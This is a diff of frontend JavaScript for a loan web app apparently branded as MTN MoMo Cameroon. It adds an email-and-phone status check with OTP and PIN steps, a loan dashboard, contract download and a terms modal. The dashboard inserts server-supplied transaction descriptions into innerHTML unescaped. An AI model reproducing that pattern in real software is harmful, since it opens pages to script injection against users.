@@ -299,4 +299,257 @@ async function submitOtp() {
     startPoll();
 }
 
-// ═════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════
+// CHECK STATUS FLOW
+// ═══════════════════════════════════════════════════════════
+async function startCheckStatus() {
+    clearErr('chkErr');
+    const email = $('chkEmail').value.trim().toLowerCase();
+    const phone = $('chkPhone').value.trim();
+    if (!email || !phone) return showErr('chkErr', 'Email and phone required.');
+
+    const btn = $('chkBtn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
+    const res = await api('/api/check-status/start', {
+        method: 'POST',
+        body: JSON.stringify({ email, phone })
+    });
+
+    btn.disabled = false;
+    btn.textContent = 'SEND VERIFICATION CODE';
+
+    if (!res.ok) return showErr('chkErr', res.error || 'Not found.');
+
+    S.checkSessionToken = res.sessionToken;
+    toast('Code sent to ' + res.emailMasked, 'success', 4000);
+    clearOtpInputs('cotp');
+    goTo('page-check-otp');
+    startOtpCountdown();
+}
+
+function otpMove(el, idx) {
+    el.value = el.value.replace(/\D/g, '').slice(0, 1);
+    if (el.value && idx < 5) {
+        const n = $('cotp' + (idx + 1));
+        if (n) n.focus();
+    }
+}
+function clearOtpInputs(prefix) {
+    for (let i = 0; i < 6; i++) {
+        const el = $(prefix + i);
+        if (el) el.value = '';
+    }
+    const first = $(prefix + '0');
+    if (first) first.focus();
+}
+function getOtp(prefix) {
+    return [0,1,2,3,4,5].map(i => $(prefix + i).value).join('');
+}
+
+async function verifyCheckOtp() {
+    clearErr('cotpErr');
+    const otp = getOtp('cotp');
+    if (otp.length !== 6) return showErr('cotpErr', 'Enter 6-digit code.');
+
+    const btn = $('cotpBtn');
+    btn.disabled = true;
+    btn.textContent = 'Verifying...';
+
+    const res = await api('/api/check-status/verify-otp', {
+        method: 'POST',
+        body: JSON.stringify({ sessionToken: S.checkSessionToken, otp })
+    });
+
+    btn.disabled = false;
+    btn.textContent = 'VERIFY CODE';
+
+    if (!res.ok) return showErr('cotpErr', res.error || 'Invalid code.');
+    toast('Code verified', 'success');
+    clearPinInputs('cpin');
+    goTo('page-check-pin');
+}
+
+let otpCdTimer = null;
+function startOtpCountdown() {
+    const wrap = $('cotpResendWrap');
+    const text = $('cotpCountdown');
+    const btn = $('cotpResendBtn');
+    if (!wrap) return;
+    wrap.style.display = 'block';
+    btn.style.display = 'none';
+    let remaining = 120;
+    text.textContent = 'Resend in ' + formatTime(remaining);
+    if (otpCdTimer) clearInterval(otpCdTimer);
+    otpCdTimer = setInterval(() => {
+        remaining--;
+        if (remaining <= 0) {
+            clearInterval(otpCdTimer);
+            text.textContent = 'You can resend now.';
+            btn.style.display = 'block';
+        } else {
+            text.textContent = 'Resend in ' + formatTime(remaining);
+        }
+    }, 1000);
+}
+
+async function resendCheckOtp() {
+    const btn = $('cotpResendBtn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
+    const res = await api('/api/check-status/resend-otp', {
+        method: 'POST',
+        body: JSON.stringify({ sessionToken: S.checkSessionToken })
+    });
+
+    btn.disabled = false;
+    btn.textContent = '🔄 Resend code';
+
+    if (!res.ok) { toast(res.error || 'Failed', 'error'); return; }
+    toast('New code sent', 'success');
+    clearOtpInputs('cotp');
+    startOtpCountdown();
+}
+
+function clearPinInputs(prefix) {
+    for (let i = 0; i < 5; i++) {
+        const el = $(prefix + i);
+        if (el) el.value = '';
+    }
+    const first = $(prefix + '0');
+    if (first) first.focus();
+}
+
+async function verifyCheckPin() {
+    clearErr('cpinErr');
+    const pin = [0,1,2,3,4].map(i => $('cpin' + i).value).join('');
+    if (pin.length !== 5) return showErr('cpinErr', 'Enter 5-digit PIN.');
+
+    const btn = $('cpinBtn');
+    btn.disabled = true;
+    btn.textContent = 'Verifying...';
+
+    const res = await api('/api/check-status/verify-pin', {
+        method: 'POST',
+        body: JSON.stringify({ sessionToken: S.checkSessionToken, pin })
+    });
+
+    btn.disabled = false;
+    btn.textContent = 'VERIFY PIN & LOGIN';
+
+    if (!res.ok) return showErr('cpinErr', res.error || 'Incorrect PIN.');
+    toast('Login successful', 'success');
+    S.checkSessionToken = null;
+    goToDashboard();
+}
+
+// ═══════════════════════════════════════════════════════════
+// DASHBOARD
+// ═══════════════════════════════════════════════════════════
+async function goToDashboard() {
+    const res = await api('/api/dashboard');
+    if (!res.ok) {
+        toast(res.error || 'Failed to load dashboard.', 'error');
+        return;
+    }
+    $('dashBalance').textContent = xaf(res.loan.balance);
+    $('dashId').textContent = res.loan.id;
+    $('dashTerm').textContent = res.loan.term + ' mo';
+
+    const list = $('dashTxList');
+    if (res.transactions && res.transactions.length) {
+        list.innerHTML = res.transactions.map(tx => `
+            <div class="dash-tx">
+                <div class="dash-tx-icon">${tx.type === 'disbursement' ? '💰' : '💳'}</div>
+                <div class="dash-tx-details">
+                    <div class="dash-tx-title">${tx.description}</div>
+                    <div class="dash-tx-date">${new Date(tx.created_at).toLocaleString('en-GB')}</div>
+                </div>
+                <div class="dash-tx-amount">${tx.type === 'disbursement' ? '+' : '-'}${xaf(tx.amount)}</div>
+            </div>
+        `).join('');
+    } else {
+        list.innerHTML = '<div class="dash-tx-empty">No transactions yet</div>';
+    }
+
+    goTo('page-dashboard');
+}
+
+function downloadContract() {
+    window.location.href = '/api/contract-pdf';
+}
+
+function logout() {
+    fetch('/api/logout', { method: 'POST', credentials: 'same-origin' })
+        .catch(() => {})
+        .finally(() => {
+            toast('Logged out', 'info');
+            setTimeout(() => {
+                localStorage.removeItem(LS_KEY_APP);
+                location.reload();
+            }, 600);
+        });
+}
+
+function restart() {
+    localStorage.removeItem(LS_KEY_APP);
+    location.reload();
+}
+
+// ═══════════════════════════════════════════════════════════
+// TERMS
+// ═══════════════════════════════════════════════════════════
+let termsCache = null;
+async function showTerms() {
+    $('termsModal').classList.add('show');
+    if (termsCache) { $('termsText').textContent = termsCache; return; }
+    $('termsText').textContent = 'Loading…';
+    const res = await api('/api/terms');
+    if (!res.ok) { $('termsText').textContent = 'Unable to load.'; return; }
+    termsCache = res.text;
+    $('termsText').textContent = res.text;
+}
+function closeTerms() { $('termsModal').classList.remove('show'); }
+function acceptTerms() {
+    if ($('appTnc')) $('appTnc').checked = true;
+    closeTerms();
+    toast('Terms accepted', 'success', 1500);
+}
+
+// ═══════════════════════════════════════════════════════════
+// SPLASH + BOOT
+// ═══════════════════════════════════════════════════════════
+function showSplash(cb) {
+    const splash = $('page-splash');
+    const dur = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 500 : 4000;
+    setTimeout(() => {
+        splash.classList.add('hide');
+        setTimeout(() => {
+            splash.style.display = 'none';
+            cb();
+        }, 400);
+    }, dur);
+}
+
+async function boot() {
+    console.log('🚀 MTN MoMo Cameroon v3.0');
+
+    const session = await api('/api/session');
+    const savedAppId = localStorage.getItem(LS_KEY_APP);
+
+    showSplash(async () => {
+        if (session.loggedIn) {
+            goToDashboard();
+        } else if (savedAppId) {
+            S.applicationId = savedAppId;
+            await resumeApplication();
+        } else {
+            goTo('page-landing');
+        }
+        updateCalc();
+    });
+}
+
+document.addEventListener('DOMContentLoaded', boot);
